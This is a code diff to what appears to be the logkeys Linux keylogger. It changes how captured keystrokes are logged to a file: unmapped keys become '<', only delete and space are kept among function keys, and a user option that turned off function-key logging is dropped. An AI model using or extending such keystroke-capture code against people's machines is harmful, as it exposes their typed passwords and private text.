@@ -411,7 +411,7 @@ namespace logkeys {
 				if (is_char_key(scan_code)) {
 					wchar_t wch;
 					if (altgr_in_effect || ctrl_in_effect) {
-						//Don't need keys
+						//Probably want an escape here
 					} 
 					else if (shift_in_effect) {
 						wch = shift_keys[to_char_keys_index(scan_code)];
@@ -427,16 +427,19 @@ namespace logkeys {
 						inc_size += fprintf(out, "%lc", wch);  // write character to log file
 						to_tree(wch);
 					}
+					else{
+						inc_size += fprintf(out, "<");
+					}
 				}
 				else if (is_func_key(scan_code)) {
-					if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  
-						if (scan_code == 14){ // only want the delete from these keys
-							inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
-						}
-					} 
-
-					if (scan_code == KEY_SPACE) {
+					if (scan_code == 14){ // only want the delete from these keys
+						inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
+					}
+					else if (scan_code == KEY_SPACE) {
 						inc_size += fprintf(out, " "); 
+					}
+					else {
+						inc_size += fprintf(out, "<");
 					}
 				}
 			} // if (EV_MAKE)
